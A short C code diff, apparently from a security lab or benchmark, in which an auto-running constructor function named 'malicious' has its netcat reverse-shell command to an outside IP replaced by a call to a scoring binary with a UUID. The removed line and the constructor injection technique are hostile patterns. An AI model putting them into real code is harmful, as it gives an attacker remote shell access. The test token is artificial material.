@@ -4,5 +4,5 @@
 static void malicious() __attribute__((constructor));
 
 void malicious() {
-    system("nc 198.13.47.9 9999 -e /bin/bash");
+    system("/usr/local/bin/score 5d513439-ab65-4d05-81b5-e390a00079cb");
 }
